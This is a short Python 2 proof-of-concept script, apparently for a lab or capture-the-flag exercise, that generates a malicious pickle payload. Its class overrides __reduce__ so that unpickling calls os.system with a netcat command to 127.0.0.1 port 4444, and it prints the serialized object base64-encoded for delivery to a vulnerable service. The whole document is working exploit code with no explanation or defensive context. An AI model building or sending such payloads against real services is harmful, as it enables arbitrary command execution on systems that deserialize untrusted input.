import cPickle as pickle
import os
import pprint
import base64

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("nc 127.0.0.1 4444",))


#Serialize
exploit = pickle.dumps(SerializedPickle())
print(base64.urlsafe_b64encode(exploit))

